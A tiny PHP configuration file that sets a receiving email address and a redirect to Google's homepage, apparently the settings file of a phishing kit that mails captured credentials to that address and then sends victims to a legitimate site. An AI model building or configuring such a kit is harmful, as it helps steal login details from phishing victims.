<?php 
$Receive_email="shop163@yahoo.com";
$redirect="https://www.google.com/";
?>